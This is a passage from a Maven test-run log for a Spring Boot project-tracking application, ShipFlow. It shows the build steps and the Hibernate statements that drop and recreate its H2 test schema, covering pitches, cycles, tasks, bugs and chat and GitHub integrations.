[INFO] Scanning for projects...
[INFO] 
[INFO] ---------------< com.github.farzadsedaghatbin:shipflow >----------------
[INFO] Building ShipFlow 0.2.1
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- jacoco:0.8.11:prepare-agent (default) @ shipflow ---
[INFO] argLine set to -javaagent:/Users/farzad/.m2/repository/org/jacoco/org.jacoco.agent/0.8.11/org.jacoco.agent-0.8.11-runtime.jar=destfile=/Users/farzad/IdeaProjects/git/shapeup-tracker/backend/target/jacoco.exec
[INFO] 
[INFO] --- resources:3.3.1:resources (default-resources) @ shipflow ---
[INFO] Copying 3 resources from src/main/resources to target/classes
[INFO] Copying 54 resources from src/main/resources to target/classes
[INFO] 
[INFO] --- compiler:3.11.0:compile (default-compile) @ shipflow ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- resources:3.3.1:testResources (default-testResources) @ shipflow ---
[INFO] Copying 1 resource from src/test/resources to target/test-classes
[INFO] 
[INFO] --- compiler:3.11.0:testCompile (default-testCompile) @ shipflow ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- surefire:3.1.2:test (default-test) @ shipflow ---
[INFO] Using auto detected provider org.apache.maven.surefire.junitplatform.JUnitPlatformProvider
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.github.farzadsedaghatbin.shipflow.repository.PitchRepositoryTest
23:26:15.490 [main] INFO org.springframework.test.context.support.AnnotationConfigContextLoaderUtils -- Could not detect default configuration classes for test class [com.github.farzadsedaghatbin.shipflow.repository.PitchRepositoryTest]: PitchRepositoryTest does not declare any static, non-private, non-final, nested classes annotated with @Configuration.
23:26:15.593 [main] INFO org.springframework.boot.test.context.SpringBootTestContextBootstrapper -- Found @SpringBootConfiguration com.github.farzadsedaghatbin.shipflow.ShipFlowApplication for test class com.github.farzadsedaghatbin.shipflow.repository.PitchRepositoryTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:15.848Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.repository.PitchRepositoryTest   : Starting PitchRepositoryTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:15.848Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.repository.PitchRepositoryTest   : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:15.849Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.repository.PitchRepositoryTest   : The following 1 profile is active: "test"
2026-01-17T23:26:16.741Z  INFO 89700 --- [shipflow] [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2026-01-17T23:26:16.781Z  INFO 89700 --- [shipflow] [           main] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 6.4.1.Final
2026-01-17T23:26:16.805Z  INFO 89700 --- [shipflow] [           main] o.h.c.internal.RegionFactoryInitiator    : HHH000026: Second-level cache disabled
2026-01-17T23:26:16.985Z  WARN 89700 --- [shipflow] [           main] org.hibernate.orm.deprecation            : HHH90000025: H2Dialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
2026-01-17T23:26:18.119Z  INFO 89700 --- [shipflow] [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
Hibernate: drop table if exists betting_slots cascade 
Hibernate: drop table if exists bug_reports cascade 
Hibernate: drop table if exists custom_dashboards cascade 
Hibernate: drop table if exists custom_metrics cascade 
Hibernate: drop table if exists cycles cascade 
Hibernate: drop table if exists dashboard_notifications cascade 
Hibernate: drop table if exists dashboard_widget_configs cascade 
Hibernate: drop table if exists dashboard_widgets cascade 
Hibernate: drop table if exists evidences cascade 
Hibernate: drop table if exists github_branches cascade 
Hibernate: drop table if exists github_commits cascade 
Hibernate: drop table if exists github_configuration cascade 
Hibernate: drop table if exists github_pull_requests cascade 
Hibernate: drop table if exists github_repositories cascade 
Hibernate: drop table if exists github_webhook_events cascade 
Hibernate: drop table if exists hill_chart_history cascade 
Hibernate: drop table if exists hill_chart_points cascade 
Hibernate: drop table if exists knowledge_items cascade 
Hibernate: drop table if exists manual_notes cascade 
Hibernate: drop table if exists meeting_actions cascade 
Hibernate: drop table if exists meetings cascade 
Hibernate: drop table if exists metric_data_points cascade 
Hibernate: drop table if exists organization_settings cascade 
Hibernate: drop table if exists password_reset_tokens cascade 
Hibernate: drop table if exists permissions cascade 
Hibernate: drop table if exists persons cascade 
Hibernate: drop table if exists pitch_github_links cascade 
Hibernate: drop table if exists pitches cascade 
Hibernate: drop table if exists projects cascade 
Hibernate: drop table if exists qa_interactions cascade 
Hibernate: drop table if exists retro_item_votes cascade 
Hibernate: drop table if exists retro_items cascade 
Hibernate: drop table if exists retrospectives cascade 
Hibernate: drop table if exists risk_feedback cascade 
Hibernate: drop table if exists slack_channel_config cascade 
Hibernate: drop table if exists slack_configuration cascade 
Hibernate: drop table if exists slack_notification_history cascade 
Hibernate: drop table if exists task_dependencies cascade 
Hibernate: drop table if exists task_github_links cascade 
Hibernate: drop table if exists tasks cascade 
Hibernate: drop table if exists team_assignments cascade 
Hibernate: drop table if exists teams cascade 
Hibernate: drop table if exists teams_channel_config cascade 
Hibernate: drop table if exists teams_configuration cascade 
Hibernate: drop table if exists teams_notification_history cascade 
Hibernate: drop table if exists test_cases cascade 
Hibernate: drop table if exists test_runs cascade 
Hibernate: drop table if exists uploaded_documents cascade 
Hibernate: drop table if exists user_preferences cascade 
Hibernate: drop table if exists users cascade 
Hibernate: drop table if exists work_log_timers cascade 
Hibernate: drop table if exists work_logs cascade 
Hibernate: create table betting_slots (end_date date not null, position integer not null, start_date date not null, created_at timestamp(6) not null, cycle_id bigint not null, id bigint generated by default as identity, pitch_id bigint, team_id bigint not null, updated_at timestamp(6) not null, notes TEXT, primary key (id), unique (cycle_id, team_id, position))
Hibernate: create table bug_reports (assignee_id bigint, created_at timestamp(6) not null, cycle_id bigint, id bigint generated by default as identity, pitch_id bigint, reporter_id bigint not null, resolved_at timestamp(6), scope_id bigint, task_id bigint, team_id bigint, test_run_id bigint, updated_at timestamp(6) not null, bug_key varchar(50) not null unique, tags varchar(500), actual_behavior TEXT, attachments TEXT, description TEXT not null, environment TEXT, expected_behavior TEXT, resolution TEXT, severity varchar(255) not null check (severity in ('TRIVIAL','MINOR','MAJOR','CRITICAL','BLOCKER')), status varchar(255) not null check (status in ('OPEN','IN_PROGRESS','RESOLVED','VERIFIED','CLOSED','REOPENED','WONT_FIX','DUPLICATE')), steps_to_reproduce TEXT, title varchar(255) not null, primary key (id))
Hibernate: create table custom_dashboards (is_default boolean not null, is_template boolean not null, user_context_filter boolean, created_at timestamp(6) not null, created_by bigint, cycle_id bigint, id bigint generated by default as identity, pitch_id bigint, team_id bigint, updated_at timestamp(6), user_id bigint not null, template_category varchar(50) check (template_category in ('EXECUTIVE','DEVELOPER','MANAGER','QA','CUSTOM')), name varchar(100) not null, description TEXT, layout_config TEXT, primary key (id), unique (user_id, name))
Hibernate: create table custom_metrics (is_active boolean not null, created_at timestamp(6) not null, cycle_id bigint, id bigint generated by default as identity, pitch_id bigint, team_id bigint, updated_at timestamp(6), user_id bigint not null, aggregation_type varchar(20) check (aggregation_type in ('SUM','AVG','COUNT','MIN','MAX','RATIO','PERCENTAGE')), display_format varchar(20) check (display_format in ('NUMBER','PERCENTAGE','CURRENCY','DURATION','DECIMAL')), data_source varchar(50) not null check (data_source in ('PITCH','CYCLE','TASK','WORK_LOG','TEAM','CUSTOM')), name varchar(100) not null, description TEXT, filters TEXT, formula TEXT not null, primary key (id), unique (user_id, name))
Hibernate: create table cycles (end_date date not null, is_active boolean not null, start_date date not null, id bigint generated by default as identity, project_id bigint, name varchar(255) not null, phase varchar(255) not null check (phase in ('SHAPING','BETTING','BUILD','COOLDOWN')), primary key (id))
Hibernate: create table dashboard_notifications (is_read boolean not null, created_at timestamp(6) not null, entity_id bigint, expires_at timestamp(6), id bigint generated by default as identity, read_at timestamp(6), user_id bigint not null, severity varchar(20) not null, entity_type varchar(50), type varchar(50) not null, action_url varchar(500), message TEXT, title varchar(255) not null, primary key (id))
Hibernate: create table dashboard_widget_configs (display_order integer, height integer, position_x integer, position_y integer, refresh_interval integer, width integer, created_at timestamp(6) not null, dashboard_id bigint not null, id bigint generated by default as identity, metric_id bigint, updated_at timestamp(6), widget_id bigint, widget_type varchar(50) not null, chart_config TEXT, custom_query TEXT, data_filters TEXT, settings TEXT, primary key (id))
Hibernate: create table dashboard_widgets (display_order integer not null, is_visible boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6), user_id bigint not null, widget_type varchar(50) not null, layout_config TEXT, settings TEXT, primary key (id), unique (user_id, widget_type))
Hibernate: create table evidences (date date not null, id bigint generated by default as identity, person_id bigint not null, pitch_id bigint not null, description TEXT not null, file_url varchar(255), primary key (id))
Hibernate: create table github_branches (is_default boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, repository_id bigint not null, updated_at timestamp(6) not null, head_sha varchar(40), name varchar(255) not null, primary key (id))
Hibernate: create table github_commits (commit_date timestamp(6) not null, created_at timestamp(6) not null, id bigint generated by default as identity, repository_id bigint not null, sha varchar(40) not null unique, url varchar(1000), author_email varchar(255), author_name varchar(255), author_username varchar(255), branch varchar(255), message clob, primary key (id))
Hibernate: create table github_configuration (auto_close_tasks_on_merge boolean not null, auto_link_enabled boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, repository_id bigint not null unique, updated_at timestamp(6) not null, access_token varchar(500), webhook_secret varchar(500), primary key (id))
Hibernate: create table github_pull_requests (pr_number integer not null, closed_at timestamp(6), created_at timestamp(6) not null, id bigint generated by default as identity, merged_at timestamp(6), opened_at timestamp(6) not null, repository_id bigint not null, updated_at timestamp(6) not null, state varchar(50) not null check (state in ('OPEN','CLOSED','MERGED')), title varchar(500) not null, url varchar(1000), author_username varchar(255), base_branch varchar(255) not null, head_branch varchar(255) not null, merged_by_username varchar(255), description clob, primary key (id))
Hibernate: create table github_repositories (is_active boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6) not null, full_name varchar(511) not null, url varchar(1000), default_branch varchar(255), name varchar(255) not null, owner varchar(255) not null, primary key (id))
Hibernate: create table github_webhook_events (processed boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, processed_at timestamp(6), event_type varchar(100) not null, repository_full_name varchar(511), error_message clob, payload clob not null, primary key (id))
Hibernate: create table hill_chart_history (actual_hours_at_move float(53), confidence_level integer, new_position integer not null, previous_position integer not null, progress_at_move float(53), created_at timestamp(6) not null, hill_chart_point_id bigint not null, id bigint generated by default as identity, pitch_id bigint not null, user_id bigint, note TEXT, primary key (id))
Hibernate: create table hill_chart_points (position integer not null, created_at timestamp(6) not null, id bigint generated by default as identity, pitch_id bigint not null, updated_at timestamp(6), description varchar(255) not null, scope varchar(255) not null, primary key (id))
Hibernate: create table knowledge_items (chunk_index integer not null, is_embedded boolean not null, total_chunks integer not null, author_id bigint, created_at timestamp(6) not null, cycle_id bigint, entity_id bigint not null, id bigint generated by default as identity, pitch_id bigint, team_id bigint, updated_at timestamp(6) not null, content_hash varchar(64), embedding_id varchar(100), title varchar(500), content TEXT not null, entity_type varchar(255) not null check (entity_type in ('PITCH','MEETING','WORKLOG','TEAM','CYCLE','EVIDENCE','MANUAL_NOTE','VALIDATED_QA','DOCUMENT','REFERENCE_DOCUMENT')), primary key (id))
Hibernate: create table manual_notes (include_in_knowledge boolean not null, author_id bigint not null, context_id bigint not null, created_at timestamp(6) not null, cycle_id bigint, id bigint generated by default as identity, pitch_id bigint, team_id bigint, updated_at timestamp(6) not null, context_type varchar(50) not null, content TEXT not null, title varchar(255) not null, primary key (id))
Hibernate: create table meeting_actions (due_date date, assigned_to_id bigint, id bigint generated by default as identity, meeting_id bigint not null, description TEXT not null, notes TEXT, status varchar(255) not null check (status in ('OPEN','IN_PROGRESS','COMPLETED','CANCELLED')), primary key (id))
Hibernate: create table meetings (date_held date not null, dod_ready boolean not null, dor_ready boolean not null, id bigint generated by default as identity, pitch_id bigint, retrospective_id bigint, attendees TEXT, decisions TEXT, notes TEXT, type varchar(255) not null check (type in ('SHAPING','BETTING','KICKOFF','STANDUP','DEMO','RETROSPECTIVE','HILL_CHART_REVIEW')), primary key (id))
Hibernate: create table metric_data_points (calculated_value numeric(20,4), calculation_date timestamp(6) not null, id bigint generated by default as identity, metric_id bigint not null, metadata TEXT, primary key (id))
Hibernate: create table organization_settings (default_cooldown_weeks integer not null, default_cycle_length_weeks integer not null, enable_ai_features boolean not null, enable_notifications boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6) not null, bug_statuses_json TEXT, colors_json TEXT, date_format varchar(255) not null, organization_name varchar(255) not null, pitch_categories_json TEXT, risk_thresholds_json TEXT, risk_weights_json TEXT, severity_levels_json TEXT, task_categories_json TEXT, time_zone varchar(255) not null, updated_by varchar(255) not null, primary key (id))
Hibernate: create table password_reset_tokens (used boolean not null, created_at timestamp(6) not null, expiry_date timestamp(6) not null, id bigint generated by default as identity, user_id bigint not null, token varchar(255) not null unique, primary key (id))
Hibernate: create table permissions (created_at timestamp(6) not null, id bigint generated by default as identity, description varchar(500), permission_type varchar(255) not null check (permission_type in ('CREATE','READ','UPDATE','DELETE','EXECUTE','MANAGE','APPROVE')), resource_type varchar(255) not null check (resource_type in ('CYCLE','PITCH','BUG','REPORT','PROJECT','TEAM','USER','RISK','DASHBOARD','RETROSPECTIVE','BETTING_TABLE','AI_FEATURES','SYSTEM')), role varchar(255) not null check (role in ('ADMIN','PROJECT_MANAGER','PRODUCT','DEVELOPER','QA')), primary key (id), unique (role, resource_type, permission_type))
Hibernate: create table persons (is_active boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6), avatar_url varchar(255), bio TEXT, department varchar(255), email varchar(255) unique, name varchar(255) not null, skills TEXT, primary key (id))
Hibernate: create table pitch_github_links (branch_id bigint, commit_id bigint, id bigint generated by default as identity, linked_at timestamp(6) not null, linked_by_user_id bigint, pitch_id bigint not null, pull_request_id bigint, link_type varchar(50) not null check (link_type in ('COMMIT','PULL_REQUEST','BRANCH')), primary key (id))
Hibernate: create table pitches (appetite_days integer not null, is_circuit_breaker_triggered boolean not null, circuit_breaker_date timestamp(6), created_at timestamp(6) not null, cycle_id bigint not null, id bigint generated by default as identity, team_id bigint, updated_at timestamp(6) not null, circuit_breaker_reason TEXT, description TEXT, no_gos TEXT, problem_statement TEXT, rabbit_holes TEXT, risks TEXT, solution TEXT, status varchar(255) not null check (status in ('PENDING','SHAPED','STARTED','IN_PROGRESS','TESTING','DONE','COOLDOWN','CANCELLED','CIRCUIT_BREAKER')), title varchar(255) not null, wireframe_links TEXT, primary key (id))
Hibernate: create table projects (enable_retrospectives boolean not null, is_active boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, owner_id bigint, updated_at timestamp(6), color varchar(255), description TEXT, logo_url varchar(255), name varchar(255) not null, project_key varchar(255) not null unique, primary key (id))
Hibernate: create table qa_interactions (confidence_score integer, feedback_helpful boolean, is_embedded boolean not null, context_id bigint, created_at timestamp(6) not null, cycle_id bigint, feedback_at timestamp(6), id bigint generated by default as identity, processing_time_ms bigint, team_id bigint, user_id bigint not null, context_type varchar(50), source_knowledge_ids varchar(500), answer TEXT, feedback_correction TEXT, feedback_text TEXT, feedback_type varchar(255) check (feedback_type in ('ACCURATE','INACCURATE','CORRECTED')), question TEXT not null, primary key (id))
Hibernate: create table retro_item_votes (created_at timestamp(6) not null, id bigint generated by default as identity, retro_item_id bigint not null, user_id bigint not null, primary key (id), unique (retro_item_id, user_id))
Hibernate: create table retro_items (is_anonymous boolean not null, vote_count integer not null, author_id bigint, created_at timestamp(6) not null, id bigint generated by default as identity, merged_into_id bigint, retrospective_id bigint not null, updated_at timestamp(6), column_type varchar(255) not null check (column_type in ('WENT_WELL','DID_NOT_GO_WELL','TRY_NEXT','ACTIONS')), content TEXT not null, primary key (id))
Hibernate: create table retrospectives (closed_at timestamp(6), created_at timestamp(6) not null, created_by_id bigint, cycle_id bigint not null, id bigint generated by default as identity, project_id bigint not null, updated_at timestamp(6), notes TEXT, status varchar(255) not null check (status in ('DRAFT','OPEN','CLOSED')), title varchar(255) not null, primary key (id))
Hibernate: create table risk_feedback (original_risk_score integer not null, suggested_risk_score integer, created_at timestamp(6) not null, id bigint generated by default as identity, pitch_id bigint not null, user_id bigint not null, missed_factors TEXT, notes TEXT, rating varchar(255) not null check (rating in ('ACCURATE','PARTIALLY_ACCURATE','INACCURATE','OVERLY_PESSIMISTIC','OVERLY_OPTIMISTIC')), primary key (id))
Hibernate: create table slack_channel_config (notify_betting_completed boolean not null, notify_cycle_cooldown boolean not null, notify_cycle_started boolean not null, notify_pitch_shaped boolean not null, notify_sprint_started boolean not null, notify_task_assigned boolean not null, notify_task_blocked boolean not null, notify_task_completed boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, slack_config_id bigint not null, updated_at timestamp(6) not null, channel_webhook_url varchar(1000), channel_name varchar(255) not null, primary key (id))
Hibernate: create table slack_configuration (is_enabled boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6) not null, webhook_url varchar(1000) not null, default_channel varchar(255), workspace_name varchar(255) not null unique, primary key (id))
Hibernate: create table slack_notification_history (success boolean not null, entity_id bigint, id bigint generated by default as identity, sent_at timestamp(6) not null, slack_config_id bigint not null, entity_type varchar(50), notification_type varchar(100) not null, channel_name varchar(255), error_message clob, message_text clob, primary key (id))
Hibernate: create table task_dependencies (created_at timestamp(6) not null, id bigint generated by default as identity, source_task_id bigint not null, target_task_id bigint not null, dependency_type varchar(50) not null check (dependency_type in ('BLOCKS','DEPENDS_ON','RELATED_TO')), primary key (id), unique (source_task_id, target_task_id))
Hibernate: create table task_github_links (auto_linked boolean not null, branch_id bigint, commit_id bigint, id bigint generated by default as identity, linked_at timestamp(6) not null, linked_by_user_id bigint, pull_request_id bigint, task_id bigint not null, link_type varchar(50) not null check (link_type in ('COMMIT','PULL_REQUEST','BRANCH')), primary key (id))
Hibernate: create table tasks (actual_hours numeric(5,2), due_date date, estimate_hours numeric(5,2), assignee_id bigint, completed_at timestamp(6), created_at timestamp(6) not null, created_by_id bigint, cycle_id bigint not null, id bigint generated by default as identity, pair_assignee_id bigint, parent_task_id bigint, pitch_id bigint, scope_id bigint, updated_at timestamp(6) not null, category varchar(255) not null check (category in ('PITCH_SCOPE','DEBT_IMPROVEMENT')), description TEXT, priority varchar(255) not null check (priority in ('URGENT','HIGH','MEDIUM','LOW')), status varchar(255) not null check (status in ('BACKLOG','TODO','IN_PROGRESS','BLOCKED','IN_REVIEW','DONE','CANCELLED')), tags TEXT, title varchar(255) not null, primary key (id))
Hibernate: create table team_assignments (end_date date, is_active boolean not null, start_date date not null, id bigint generated by default as identity, person_id bigint not null, team_id bigint not null, notes TEXT, role varchar(255) not null check (role in ('BACKEND','FRONTEND','QA','DESIGNER','FULLSTACK','TECH_LEAD','PRODUCT_MANAGER')), primary key (id))
Hibernate: create table teams (cycle_id bigint, id bigint generated by default as identity, name varchar(255) not null, primary key (id))
Hibernate: create table teams_channel_config (notify_betting_completed boolean not null, notify_cycle_cooldown boolean not null, notify_cycle_started boolean not null, notify_pitch_shaped boolean not null, notify_sprint_started boolean not null, notify_task_assigned boolean not null, notify_task_blocked boolean not null, notify_task_completed boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, teams_config_id bigint not null, updated_at timestamp(6) not null, channel_webhook_url varchar(1000), channel_name varchar(255) not null, primary key (id))
Hibernate: create table teams_configuration (is_enabled boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6) not null, webhook_url varchar(1000) not null, default_channel varchar(255), tenant_name varchar(255) not null unique, primary key (id))
Hibernate: create table teams_notification_history (success boolean not null, entity_id bigint, id bigint generated by default as identity, sent_at timestamp(6) not null, teams_config_id bigint not null, entity_type varchar(50), notification_type varchar(100) not null, channel_name varchar(255), error_message clob, message_text clob, primary key (id))
Hibernate: create table test_cases (ai_generated boolean not null, estimated_minutes integer, created_at timestamp(6) not null, created_by_id bigint not null, cycle_id bigint, id bigint generated by default as identity, pitch_id bigint, scope_id bigint, task_id bigint, team_id bigint, updated_at timestamp(6) not null, updated_by_id bigint, test_case_key varchar(50) not null unique, tags varchar(500), description TEXT, expected_result TEXT, preconditions TEXT, priority varchar(255) not null check (priority in ('LOW','MEDIUM','HIGH','CRITICAL')), status varchar(255) not null check (status in ('DRAFT','READY','APPROVED','DEPRECATED','ARCHIVED')), steps TEXT, title varchar(255) not null, type varchar(255) not null check (type in ('FUNCTIONAL','INTEGRATION','UNIT','E2E','REGRESSION','SMOKE','PERFORMANCE','SECURITY','USABILITY','ACCESSIBILITY')), primary key (id))
Hibernate: create table test_runs (duration_seconds integer, created_at timestamp(6) not null, cycle_id bigint, executed_at timestamp(6) not null, executed_by_id bigint not null, id bigint generated by default as identity, pitch_id bigint, test_case_id bigint not null, environment varchar(500), actual_result TEXT, attachments TEXT, build_version varchar(255), notes TEXT, status varchar(255) not null check (status in ('PENDING','RUNNING','PASSED','FAILED','BLOCKED','SKIPPED')), primary key (id))
Hibernate: create table uploaded_documents (indexed_for_qa boolean, text_extracted boolean not null, created_at timestamp(6) not null, entity_id bigint, file_size bigint, id bigint generated by default as identity, uploader_id bigint, storage_path varchar(500), entity_type varchar(255), extracted_text TEXT, file_name varchar(255) not null, file_type varchar(255) not null, original_file_name varchar(255) not null, uploader_username varchar(255), primary key (id))
Hibernate: create table user_preferences (compact_view boolean, enable_animations boolean, created_at timestamp(6) not null, id bigint generated by default as identity, updated_at timestamp(6), user_id bigint not null unique, primary_color varchar(255), secondary_color varchar(255), theme_mode varchar(255) not null check (theme_mode in ('LIGHT','DARK','SYSTEM')), primary key (id))
Hibernate: create table users (is_active boolean not null, created_at timestamp(6) not null, id bigint generated by default as identity, person_id bigint unique, updated_at timestamp(6), email varchar(255) unique, password varchar(255) not null, role varchar(255) not null check (role in ('ADMIN','PROJECT_MANAGER','PRODUCT','DEVELOPER','QA')), username varchar(255) not null unique, primary key (id))
Hibernate: create table work_log_timers (created_at timestamp(6) not null, id bigint generated by default as identity, person_id bigint not null, pitch_id bigint, start_time timestamp(6) not null, task_id bigint, note TEXT, primary key (id))
Hibernate: create table work_logs (date date not null, hours_spent numeric(4,2) not null, id bigint generated by default as identity, person_id bigint not null, pitch_id bigint, task_id bigint, note TEXT, primary key (id))
Hibernate: create index idx_bug_report_pitch on bug_reports (pitch_id)
Hibernate: create index idx_bug_report_cycle on bug_reports (cycle_id)
Hibernate: create index idx_bug_report_status on bug_reports (status)
Hibernate: create index idx_bug_report_severity on bug_reports (severity)
Hibernate: create index idx_bug_report_assignee on bug_reports (assignee_id)
Hibernate: create index idx_bug_report_reporter on bug_reports (reporter_id)
Hibernate: create index idx_notification_user on dashboard_notifications (user_id)
Hibernate: create index idx_notification_read on dashboard_notifications (is_read)
Hibernate: create index idx_notification_created on dashboard_notifications (created_at)
Hibernate: create index idx_knowledge_entity on knowledge_items (entity_type, entity_id)
Hibernate: create index idx_knowledge_cycle on knowledge_items (cycle_id)
Hibernate: create index idx_knowledge_team on knowledge_items (team_id)
Hibernate: create index idx_knowledge_embedded on knowledge_items (is_embedded)
Hibernate: create index idx_note_context on manual_notes (context_type, context_id)
Hibernate: create index idx_note_author on manual_notes (author_id)
Hibernate: create index idx_qa_user on qa_interactions (user_id)
Hibernate: create index idx_qa_context on qa_interactions (context_type, context_id)
Hibernate: create index idx_qa_created on qa_interactions (created_at)
Hibernate: create index idx_task_dep_source on task_dependencies (source_task_id)
Hibernate: create index idx_task_dep_target on task_dependencies (target_task_id)
Hibernate: create index idx_task_dep_type on task_dependencies (dependency_type)
Hibernate: create index idx_test_case_pitch on test_cases (pitch_id)
Hibernate: create index idx_test_case_cycle on test_cases (cycle_id)
Hibernate: create index idx_test_case_status on test_cases (status)
Hibernate: create index idx_test_case_created_by on test_cases (created_by_id)
Hibernate: create index idx_test_run_test_case on test_runs (test_case_id)
Hibernate: create index idx_test_run_cycle on test_runs (cycle_id)
Hibernate: create index idx_test_run_status on test_runs (status)
Hibernate: create index idx_test_run_executed_by on test_runs (executed_by_id)
Hibernate: create index idx_test_run_executed_at on test_runs (executed_at)
Hibernate: alter table if exists betting_slots add constraint FKrlcr89iu8gx2siravwknvii9d foreign key (cycle_id) references cycles
Hibernate: alter table if exists betting_slots add constraint FK8bccc4yv57hkaic08tk4r8xpf foreign key (pitch_id) references pitches
Hibernate: alter table if exists betting_slots add constraint FKlbg38ybejexask1dwbwtgnyty foreign key (team_id) references teams
Hibernate: alter table if exists bug_reports add constraint FK9gin72f25bo06q9rku5juutx5 foreign key (assignee_id) references users
Hibernate: alter table if exists bug_reports add constraint FK95n2qhi2rso2cw47a0gjvi958 foreign key (cycle_id) references cycles
Hibernate: alter table if exists bug_reports add constraint FKc7v7tuoryoynleowmengv0pt8 foreign key (pitch_id) references pitches
Hibernate: alter table if exists bug_reports add constraint FKkh0ybgasqj65g7pu64gj8x2w1 foreign key (reporter_id) references users
Hibernate: alter table if exists bug_reports add constraint FKkxsxe6r40jypphyey9xbn4aia foreign key (scope_id) references hill_chart_points
Hibernate: alter table if exists bug_reports add constraint FKn2o7q2ebltgcj59ytjmyh12a7 foreign key (task_id) references tasks
Hibernate: alter table if exists bug_reports add constraint FK3b9qxsu3eo41wbigjxycq6xpy foreign key (team_id) references teams
Hibernate: alter table if exists bug_reports add constraint FKhyf4im2rc1piiyllfxr8ybsr7 foreign key (test_run_id) references test_runs
Hibernate: alter table if exists custom_dashboards add constraint FKqwf9es7i8ya358csk8q408nxl foreign key (created_by) references users
Hibernate: alter table if exists custom_dashboards add constraint FKr8ktc1t30ndtrh302rorlt98w foreign key (cycle_id) references cycles
Hibernate: alter table if exists custom_dashboards add constraint FK4ryhqhh8du63lr78gy72p93hp foreign key (pitch_id) references pitches
Hibernate: alter table if exists custom_dashboards add constraint FKc6h7gckrs6954kobsy4h7nt7d foreign key (team_id) references teams
Hibernate: alter table if exists custom_dashboards add constraint FK2qu6h5d7b8in25dvb5lyj4k3j foreign key (user_id) references users
Hibernate: alter table if exists custom_metrics add constraint FK8xu2p1fdco6jmvqq0qxv8w2xw foreign key (cycle_id) references cycles
Hibernate: alter table if exists custom_metrics add constraint FKs50bij06cjwotqsjtl2wadoxe foreign key (pitch_id) references pitches
Hibernate: alter table if exists custom_metrics add constraint FK6l74oa16kxe7edmnnfb199lf7 foreign key (team_id) references teams
Hibernate: alter table if exists custom_metrics add constraint FK6bua44i0qeuhjpf99ryhrwlu7 foreign key (user_id) references users
Hibernate: alter table if exists cycles add constraint FKpil0qqft94igptdolg1gokta3 foreign key (project_id) references projects
Hibernate: alter table if exists dashboard_notifications add constraint FK9c4kgk7i73ou261dr4gfu2rlt foreign key (user_id) references users
Hibernate: alter table if exists dashboard_widget_configs add constraint FKd71jhhqosckju2p44ghgt367f foreign key (dashboard_id) references custom_dashboards
Hibernate: alter table if exists dashboard_widget_configs add constraint FKhdfcdpf0uxbyp27qfwmg6bxot foreign key (metric_id) references custom_metrics
Hibernate: alter table if exists dashboard_widget_configs add constraint FKbeo2nhtf4t500tyuoun0jkmj foreign key (widget_id) references dashboard_widgets
Hibernate: alter table if exists dashboard_widgets add constraint FK48jsd1b3iswx1lp61cyfsoe8g foreign key (user_id) references users
Hibernate: alter table if exists evidences add constraint FKhhi43mxeo16gs93ah9xcuxov4 foreign key (person_id) references persons
Hibernate: alter table if exists evidences add constraint FKbu5cmfre5ofj4ybk6au8hvwl5 foreign key (pitch_id) references pitches
Hibernate: alter table if exists github_branches add constraint FK9qcmude8aqy8ofiwbkrplk1ro foreign key (repository_id) references github_repositories
Hibernate: alter table if exists github_commits add constraint FKb78jmseqnfjfyfkiefw2mp0r foreign key (repository_id) references github_repositories
Hibernate: alter table if exists github_configuration add constraint FK29n6xruhyhx6q2b06xfgdirfg foreign key (repository_id) references github_repositories
Hibernate: alter table if exists github_pull_requests add constraint FKsqqjj1a7n99a1l645rlllt1io foreign key (repository_id) references github_repositories
Hibernate: alter table if exists hill_chart_history add constraint FKfo584oudnl09hlulwjwlcfx0w foreign key (hill_chart_point_id) references hill_chart_points
Hibernate: alter table if exists hill_chart_history add constraint FKs02b0fjru3h2k0reaqm2v9u80 foreign key (user_id) references users
Hibernate: alter table if exists hill_chart_history add constraint FKmxf0j2boslayu1sf85bak5vph foreign key (pitch_id) references pitches
Hibernate: alter table if exists hill_chart_points add constraint FK8ah80ex4mei4whlget6nhqa2h foreign key (pitch_id) references pitches
Hibernate: alter table if exists meeting_actions add constraint FKny38i99x3kemfks2jjohvgsa5 foreign key (assigned_to_id) references persons
Hibernate: alter table if exists meeting_actions add constraint FKm5cvawx8q5wmposbdnwxpco1x foreign key (meeting_id) references meetings
Hibernate: alter table if exists meetings add constraint FKrg4pp0bjqa0il1abk623dqlr5 foreign key (pitch_id) references pitches
Hibernate: alter table if exists meetings add constraint FK1cpfyxrab0sx11d3eai87neda foreign key (retrospective_id) references retrospectives
